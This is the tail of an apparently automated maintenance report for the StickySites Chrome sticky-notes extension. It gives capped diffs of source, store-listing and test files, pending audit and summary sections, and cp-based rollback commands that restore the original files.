... [diff excerpt capped; 374 further lines in Git]
```

### src/content/prefs.js

```diff
diff --git a/src/content/prefs.js b/src/content/prefs.js
index b1a4dce..438c1d8 100644
--- a/src/content/prefs.js
+++ b/src/content/prefs.js
@@ -1,7 +1,3 @@
 window.StickySites = window.StickySites || {};
-
 (function () {
-  var PREFS_KEY = 'stickysites_prefs_v1';
-  var DEFAULT_PREFS = { clusterPosition: { x: null, y: null }, panelMode: 'fixed', clusterLayout: 'vertical', collapseToCircle: false, iconOrder: null, enabledTypes: { global: true, site: true, page: true, todo: true, outline: true, daily: true }, panelSize: null, panelPosition: null };
-
   window.StickySites.Prefs = {
... [diff excerpt capped; 21 further lines in Git]
```

### src/content/safe-html.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/safe-html.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/safe-html.js
new file mode 100644
index 0000000..d4ecc41
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/safe-html.js
@@ -0,0 +1,54 @@
+window.StickySites = window.StickySites || {};
+(function () {
+  var allowed = new Set(['P', 'DIV', 'BR', 'SPAN', 'B', 'STRONG', 'I', 'EM', 'U', 'S', 'STRIKE', 'UL', 'OL', 'LI', 'BLOCKQUOTE', 'PRE', 'CODE', 'H1', 'H2', 'H3', 'H4', 'A', 'HR', 'INPUT', 'FONT', 'SUB', 'SUP']);
+  var drop = new Set(['SCRIPT', 'STYLE', 'IFRAME', 'OBJECT', 'EMBED', 'SVG', 'MATH', 'TEMPLATE', 'LINK', 'META']);
+  var styles = new Set(['color', 'background-color', 'font-family', 'font-size', 'font-weight', 'font-style', 'text-align', 'text-decoration', 'margin-left']);
+  function sanitize(html) {
... [diff excerpt capped; 48 further lines in Git]
```

### src/content/sticky-inject.js

```diff
diff --git a/src/content/sticky-inject.js b/src/content/sticky-inject.js
index 9bdbbaa..b6fcb4d 100644
--- a/src/content/sticky-inject.js
+++ b/src/content/sticky-inject.js
@@ -21,4 +21,5 @@
 
+  var lockedTypeId = null;
   function showLockOverlay(pendingTypeId) {
-    SS.Panel.close();
+    SS.Panel.close(true);
     var overlay = document.getElementById('stickysites-lock');
@@ -33,35 +34,21 @@
... [diff excerpt capped; 156 further lines in Git]
```

### src/content/storage-content.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/storage-content.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/storage-content.js
new file mode 100644
index 0000000..ed1ccd6
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/storage-content.js
@@ -0,0 +1,9 @@
+window.StickySites = window.StickySites || {};
+window.StickySites.Storage = {
+  async request(command) {
+    var reply = await chrome.runtime.sendMessage({ type: 'STICKYSITES_WRITE', command: command });
+    if (!reply || !reply.ok) throw new Error(reply?.error || 'STORAGE_WRITE_FAILED');
+    return reply.result;
... [diff excerpt capped; 3 further lines in Git]
```

### src/content/todo.js

```diff
diff --git a/src/content/todo.js b/src/content/todo.js
index 689d061..4ae57c4 100644
--- a/src/content/todo.js
+++ b/src/content/todo.js
@@ -12,3 +12,3 @@ window.StickySites = window.StickySites || {};
     return {
-      id: item.id || genId(),
+      id: (typeof item.id === 'string' || typeof item.id === 'number') && String(item.id) ? String(item.id) : genId(),
       text: String(item.text ?? ''),
@@ -18,3 +18,3 @@ window.StickySites = window.StickySites || {};
       color: typeof item.color === 'string' ? item.color : '',
-      tags: Array.isArray(item.tags) ? item.tags : [],
... [diff excerpt capped; 42 further lines in Git]
```

### src/shared/network.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/network.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/network.js
new file mode 100644
index 0000000..60215dc
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/network.js
@@ -0,0 +1,16 @@
+(function (root) {
+  root.StickySites = root.StickySites || {};
+  root.StickySites.request = async function (fetcher, url, options, json) {
+    var controller = new AbortController(), timer;
+    var timeout = new Promise(function (_, reject) {
+      timer = setTimeout(function () { controller.abort(); reject(new Error('NETWORK_TIMEOUT')); }, root.StickySites.Settings.networkTimeoutMs);
... [diff excerpt capped; 10 further lines in Git]
```

### src/shared/note-writer.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/note-writer.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/note-writer.js
new file mode 100644
index 0000000..934894c
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/note-writer.js
@@ -0,0 +1,127 @@
+import './settings.js';
+import { importJwk, decrypt, encrypt, isEncrypted } from './crypto.js';
+import { NOTE_KEYS, CRYPTO_KEY, CACHED_KEY, TOMBSTONES_KEY, PEER_STATE_KEY } from './peer-sync.js';
+
+const PREFS_KEY = 'stickysites_prefs_v1';
+const allowed = new Set([...NOTE_KEYS, CRYPTO_KEY, CACHED_KEY, TOMBSTONES_KEY, PEER_STATE_KEY, PREFS_KEY]);
... [diff excerpt capped; 121 further lines in Git]
```

### src/shared/notes-storage.js

```diff
diff --git a/src/shared/notes-storage.js b/src/shared/notes-storage.js
index 3bf8366..7d16e9f 100644
--- a/src/shared/notes-storage.js
+++ b/src/shared/notes-storage.js
@@ -7,13 +7,17 @@ const OUTLINES_KEY = 'stickysites_outlines_v1';
 const DAILY_KEY = 'stickysites_daily_v1';
-// Must match DEFAULT_PREFS in src/content/prefs.js (the content-script namespace copy).
-const DEFAULT_PREFS = {
-  clusterPosition: { x: null, y: null },
-  panelMode: 'fixed',
-  clusterLayout: 'vertical',
-  collapseToCircle: false,
... [diff excerpt capped; 395 further lines in Git]
```

### src/shared/peer-sync.js

```diff
diff --git a/src/shared/peer-sync.js b/src/shared/peer-sync.js
index cb0b959..af9581e 100644
--- a/src/shared/peer-sync.js
+++ b/src/shared/peer-sync.js
@@ -1,4 +1,6 @@
+import './settings.js';
+import './network.js';
 // Local peer sync: keep two or more browsers on the same LAN converged without a server.
 //
-// The extension never talks to the network itself. A small local daemon (peer/stickysites-peer.py)
+// The extension calls loopback HTTP. A small local daemon (peer/stickysites-peer.py)
 // discovers peers on the LAN and exchanges *snapshots*; the extension pushes its snapshot to the
... [diff excerpt capped; 140 further lines in Git]
```

### src/shared/settings.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/settings.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/settings.js
new file mode 100644
index 0000000..2541e9f
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/settings.js
@@ -0,0 +1,26 @@
+// Classic script shared by extension pages, content scripts, and the module worker.
+(function (root) {
+  root.StickySites = root.StickySites || {};
+  var types = ['global', 'site', 'page', 'todo', 'outline', 'daily'];
+  function object(v) { return v && typeof v === 'object' && !Array.isArray(v) ? v : {}; }
+  function point(v, nullable) {
... [diff excerpt capped; 20 further lines in Git]
```

### src/shared/todo-bridge.js

```diff
diff --git a/src/shared/todo-bridge.js b/src/shared/todo-bridge.js
index 3e1c13e..9fc2244 100644
--- a/src/shared/todo-bridge.js
+++ b/src/shared/todo-bridge.js
@@ -1 +1,2 @@
+import './settings.js';
 // Sync the global to-do list with the local TODO.md through the native-messaging host
@@ -47,3 +48,4 @@ export function applyHostResult(record, hostItems) {
     let section = hostSection ? sectionId(hostSection) : '';
-    if (!hostSection && local?.section && !hostNames.has(sectionName(local.section))) {
+    const localSection = sections.find(s => s.id === local?.section);
+    if (!hostSection && localSection && localSection.origin !== 'host' && !isHostSection(localSection.name) && !hostNames.has(sectionName(local.section))) {
... [diff excerpt capped; 44 further lines in Git]
```

### store/README.md

```diff
diff --git a/store/README.md b/store/README.md
index b661054..e0a0bfc 100644
--- a/store/README.md
+++ b/store/README.md
@@ -2,7 +2,8 @@
 
-Everything needed to publish StickySites on the Chrome Web Store, what is already done, and
-the handful of steps only the account owner can do. Version in this kit: **1.13.0**.
+Submission assets and instructions for publishing StickySites on the Chrome Web Store.
+The account owner completes the publishing steps. The package version comes from
+`manifest.json`; rebuild and verify the kit for each release.
 
... [diff excerpt capped; 80 further lines in Git]
```

### store/listing.md

```diff
diff --git a/store/listing.md b/store/listing.md
index 79bb258..4c97185 100644
--- a/store/listing.md
+++ b/store/listing.md
@@ -1,2 +1,2 @@
-# Chrome Web Store listing copy — StickySites 1.13.0
+# Chrome Web Store listing copy — StickySites
 
@@ -19,3 +19,3 @@ Sticky notes for every website. Global notes, per-site notes, and per-page notes
 ```
-StickySites puts a sticky note on every website — and keeps everything on your device.
+StickySites puts a sticky note on every website, with local storage and optional sync you control.
... [diff excerpt capped; 68 further lines in Git]
```

### store/permissions-justifications.md

```diff
diff --git a/store/permissions-justifications.md b/store/permissions-justifications.md
index 2669501..1f5a3a5 100644
--- a/store/permissions-justifications.md
+++ b/store/permissions-justifications.md
@@ -8,4 +8,5 @@ pasted verbatim. Keep them factual — reviewers compare against the code.
 Saves the user's notes, to-do items, outlines, and settings in chrome.storage.local on the
-user's device. This is the extension's only data store; nothing is written anywhere else and
-nothing is synced or uploaded.
+user's device, including vault configuration and sync state. Optional sync can also place
+snapshots on paired computers or in a shared/cloud folder selected by the user; the extension
+operates no hosted collection service.
 ```
... [diff excerpt capped; 19 further lines in Git]
```

### tests/browser-integration.test.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/browser-integration.test.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/browser-integration.test.js
new file mode 100644
index 0000000..a1806e6
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/browser-integration.test.js
@@ -0,0 +1,41 @@
+import { it, expect } from 'vitest';
+import { readFileSync } from 'node:fs';
+import { runtime } from './helpers/runtime.js';
+import { createNoteWriter } from '../src/shared/note-writer.js';
+const manifest = JSON.parse(readFileSync(new URL('../manifest.json', import.meta.url), 'utf8'));
+const settle = async predicate => { for (let i=0;i<200;i++) { if(predicate())return; await new Promise(resolve=>setTimeout(resolve,1)); } throw Error('fixture did not settle'); };
... [diff excerpt capped; 35 further lines in Git]
```

### tests/crypto-vault-compat.test.js

```diff
diff --git a/tests/crypto-vault-compat.test.js b/tests/crypto-vault-compat.test.js
index 38158e2..9720e67 100644
--- a/tests/crypto-vault-compat.test.js
+++ b/tests/crypto-vault-compat.test.js
@@ -11,3 +11,5 @@
 import { describe, it, expect } from 'vitest';
-import { readFileSync } from 'node:fs';
+import { lstatSync, readFileSync } from 'node:fs';
+import { createRequire } from 'node:module';
+import path from 'node:path';
 import { importJwk, decrypt as oldDecrypt, encrypt as oldEncrypt } from '../src/shared/crypto.js';
@@ -16,8 +18,10 @@ const fixtures = JSON.parse(readFileSync(new URL('./fixtures/legacy-crypto-envel
... [diff excerpt capped; 16 further lines in Git]
```

### tests/helpers/runtime.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/helpers/runtime.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/helpers/runtime.js
new file mode 100644
index 0000000..f490171
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/helpers/runtime.js
@@ -0,0 +1,20 @@
+import { JSDOM } from 'jsdom';
+import { readFileSync } from 'node:fs';
+import { webcrypto } from 'node:crypto';
+export function runtime(initial = {}, html = '', options = {}) {
+  const dom = new JSDOM(html || '<!doctype html><body></body>', { url: options.url || 'https://example.test/page', runScripts: 'outside-only', pretendToBeVisual: true });
+  const w = dom.window;
... [diff excerpt capped; 14 further lines in Git]
```

### tests/notes-storage.test.js

```diff
diff --git a/tests/notes-storage.test.js b/tests/notes-storage.test.js
index ffd92ec..e69813d 100644
--- a/tests/notes-storage.test.js
+++ b/tests/notes-storage.test.js
@@ -7,7 +7,7 @@ globalThis.chrome = {
       get: async (keys) => {
-        if (typeof keys === 'string') return { [keys]: store[keys] };
-        if (Array.isArray(keys)) return Object.fromEntries(keys.map(k => [k, store[k]]));
-        return { ...store };
+        if (typeof keys === 'string') return structuredClone({ [keys]: store[keys] });
+        if (Array.isArray(keys)) return structuredClone(Object.fromEntries(keys.map(k => [k, store[k]])));
+        return structuredClone(store);
... [diff excerpt capped; 44 further lines in Git]
```

### tests/popup-regressions.test.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/popup-regressions.test.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/popup-regressions.test.js
new file mode 100644
index 0000000..48c9407
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/popup-regressions.test.js
@@ -0,0 +1,138 @@
+import { afterEach, expect, it, vi } from 'vitest';
+import { readFileSync } from 'node:fs';
+import { runtime } from './helpers/runtime.js';
+import { createNoteWriter } from '../src/shared/note-writer.js';
+const opened = [];
+afterEach(() => { for (const r of opened.splice(0)) r.close(); });
... [diff excerpt capped; 132 further lines in Git]
```

### tests/runtime-regressions.test.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/runtime-regressions.test.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/runtime-regressions.test.js
new file mode 100644
index 0000000..0468aef
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/runtime-regressions.test.js
@@ -0,0 +1,61 @@
+async function entered(predicate) { for (let i=0;i<200;i++) { if(predicate()) return; await new Promise(resolve=>setTimeout(resolve,1)); } throw Error('fixture callback deadline'); }
+import { describe, it, expect } from 'vitest';
+import { runtime } from './helpers/runtime.js';
+const CONFIG = 'stickysites_crypto_v1', NOTES = 'stickysites_global_v1';
+describe('actual browser modules', () => {
+  it('keeps vault config and ciphertext when disabling without a key', async () => {
... [diff excerpt capped; 55 further lines in Git]
```

### tests/service-worker.test.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/service-worker.test.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/service-worker.test.js
new file mode 100644
index 0000000..c061427
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/service-worker.test.js
@@ -0,0 +1,50 @@
+import { it, expect, vi } from 'vitest';
+import { runtime } from './helpers/runtime.js';
+it('Sync now awaits the already active actual service-worker round',async()=>{
+  vi.useFakeTimers();const r=runtime();const messages=[],alarms=[];const event={addListener(){}};
+  try{
+    const chrome={storage:{local:r.storage,onChanged:{addListener(){}}},runtime:{id:'fixture',onMessage:{addListener:fn=>messages.push(fn)},onInstalled:event,onStartup:event},alarms:{create(){},onAlarm:{addListener:fn=>alarms.push(fn)}},contextMenus:{create(){},onClicked:event},commands:{onCommand:event}};
... [diff excerpt capped; 44 further lines in Git]
```

### tests/sync-regressions.test.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/sync-regressions.test.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/sync-regressions.test.js
new file mode 100644
index 0000000..76888ed
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/sync-regressions.test.js
@@ -0,0 +1,33 @@
+import { it, expect, vi } from 'vitest';
+import { runtime } from './helpers/runtime.js';
+import { syncWithDaemon, CRYPTO_KEY, CACHED_KEY, NOTE_KEYS } from '../src/shared/peer-sync.js';
+import { syncTodosWithHost, TODOS_KEY } from '../src/shared/todo-bridge.js';
+const peer = { name: 'p', id: 'p', snapshot: { version: 1, deviceId: 'p', notes: { [NOTE_KEYS[0]]: { body: 'remote', updatedAt: '2026-03-01' } } } };
+it('ignores malformed peer entries without losing a valid peer', async () => {
... [diff excerpt capped; 27 further lines in Git]
```

### tests/tooling-browser.test.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling-browser.test.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling-browser.test.js
new file mode 100644
index 0000000..063f957
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling-browser.test.js
@@ -0,0 +1,65 @@
+import { afterEach, expect, it, vi } from 'vitest';
+import vm from 'node:vm';
+
+import { closePanel, openNoteForScreenshot as openNote, encryptedNoteBuckets, persistedSiteBody, restoredNoteContent } from '../scripts/browser-checks.mjs';
+
+function mockPage() {
... [diff excerpt capped; 59 further lines in Git]
```

### tests/tooling-docs.test.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling-docs.test.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling-docs.test.js
new file mode 100644
index 0000000..9a8bd70
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling-docs.test.js
@@ -0,0 +1,120 @@
+import { afterEach, expect, it } from 'vitest';
+import { chmodSync, copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
+import { execFileSync, spawnSync } from 'node:child_process';
+import os from 'node:os';
+import path from 'node:path';
+import { fileURLToPath } from 'node:url';
... [diff excerpt capped; 114 further lines in Git]
```

### tests/tooling-harness.test.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling-harness.test.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling-harness.test.js
new file mode 100644
index 0000000..215697c
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling-harness.test.js
@@ -0,0 +1,90 @@
+import { afterEach, expect, it } from 'vitest';
+import { accessSync, existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync, chmodSync } from 'node:fs';
+import os from 'node:os';
+import path from 'node:path';
+
+const roots = [];
... [diff excerpt capped; 84 further lines in Git]
```

### tests/tooling.test.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling.test.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling.test.js
new file mode 100644
index 0000000..de2d0a7
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling.test.js
@@ -0,0 +1,267 @@
+import { afterEach, describe, expect, it } from 'vitest';
+import { copyFileSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
+import { execFileSync, spawn, spawnSync } from 'node:child_process';
+import os from 'node:os';
+import path from 'node:path';
+import { fileURLToPath } from 'node:url';
... [diff excerpt capped; 261 further lines in Git]
```

### tests/ui-boundaries.test.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/ui-boundaries.test.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/ui-boundaries.test.js
new file mode 100644
index 0000000..67536d2
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/ui-boundaries.test.js
@@ -0,0 +1,73 @@
+import { it, expect } from 'vitest';
+import { runtime } from './helpers/runtime.js';
+import { createNoteWriter } from '../src/shared/note-writer.js';
+const GLOBAL='stickysites_global_v1', OUTLINES='stickysites_outlines_v1';
+const files=['src/shared/settings.js','src/content/storage-content.js','src/content/crypto-content.js','src/content/safe-html.js','src/content/prefs.js','src/content/note-types.js','src/content/todo.js','src/content/outline-ops.js','src/content/outline.js','src/content/mentions.js','src/content/panel.js'];
+function app(initial={}) {
... [diff excerpt capped; 67 further lines in Git]
```

### tests/vault-import.test.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/vault-import.test.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/vault-import.test.js
new file mode 100644
index 0000000..0434fb8
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/vault-import.test.js
@@ -0,0 +1,33 @@
+import { afterEach, expect, it } from 'vitest';
+import { copyFileSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
+import { spawnSync } from 'node:child_process';
+import os from 'node:os';
+import path from 'node:path';
+const roots = [];
... [diff excerpt capped; 27 further lines in Git]
```

### tests/vault-legacy.test.js

```diff
diff --git a/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/vault-legacy.test.js b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/vault-legacy.test.js
new file mode 100644
index 0000000..24967c2
--- /dev/null
+++ b/Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/vault-legacy.test.js
@@ -0,0 +1,18 @@
+// Always-on compatibility coverage uses the frozen legacy corpus and real shared crypto.
+// It does not require the optional private vault package or regenerate the fixtures.
+import { expect, it } from 'vitest';
+import { readFileSync } from 'node:fs';
+import { deriveKey, decrypt, encrypt, importJwk } from '../src/shared/crypto.js';
+const fixtures = JSON.parse(readFileSync(new URL('./fixtures/legacy-crypto-envelopes.json', import.meta.url), 'utf8'));
... [diff excerpt capped; 12 further lines in Git]
```

## 6. Blind re-audit

in progress

The gate receives only final complete artifacts, Stage0.5, the pass list and local review boundaries. It receives no findings tables, fix rationale or revision history. All substantive JSONL messages and receipts are collected; final artifact hashes must match. At most two nested readers run. A first corroborated dissent permits one further fix iteration and one second gate. A second corroborated dissent must remain explicit rather than being labeled CLEAN. Cross-model review is N/A because it was not requested.

## 7. Recommendations

N/A: --suggest was not selected. Low residuals above are bounded observations, not an advisory workstream or feature backlog invented by this run.

## 8. Implemented features

N/A: --implement-features was not selected. Changes implement corroborated correctness, robustness, privacy and workflow repairs.

## 9. Summary

Iterations:2 finding/fix sweeps · Active passes:18 · Profile:standard · Final C/H/M/L:pending/qualitative · Verify:pending final gates · Status:PENDING.

## 10. Snapshot and rollback

Central originals: `/Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original`; original130-file SHA ledger and `baseline.sha256` verified with zero mismatches. Complete per-iteration copies and atomic `run-stub.jsonl` preserve continuation context. Manual rollback below restores only task files; first ensure there are no later/shared edits. It does not restore user data edited after installing a release. After merge, use a reviewed revert PR rather than rewriting main.

```sh
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/.env.example /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/.env.example
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/.github/FUNDING.yml /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/.github/FUNDING.yml
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/.github/PULL_REQUEST_TEMPLATE.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/.github/PULL_REQUEST_TEMPLATE.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/.github/SECURITY.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/.github/SECURITY.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/.github/copilot-instructions.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/.github/copilot-instructions.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/.github/dependabot.yml /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/.github/dependabot.yml
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/.github/workflows/ci.yml /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/.github/workflows/ci.yml
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/.vscode/extensions.json /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/.vscode/extensions.json
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/.vscode/launch.json /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/.vscode/launch.json
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/.vscode/settings.json /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/.vscode/settings.json
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/CLAUDE.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/CLAUDE.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/CONTRIBUTING.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/CONTRIBUTING.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/GEMINI.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/GEMINI.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/PRIVACY.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/PRIVACY.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/README.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/README.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/ARCHITECTURE.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/ARCHITECTURE.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/COMPONENTS.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/COMPONENTS.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/DEVELOPMENT.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/DEVELOPMENT.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/INSTALLATION.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/INSTALLATION.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/MCP.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/MCP.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/SECURITY.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/SECURITY.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/TESTING.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/TESTING.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/caching-and-optimization.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/caching-and-optimization.md
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/code-deep-optimizer-2026-11-12.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/external-calls.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/external-calls.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/integrations-and-assumptions.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/integrations-and-assumptions.md
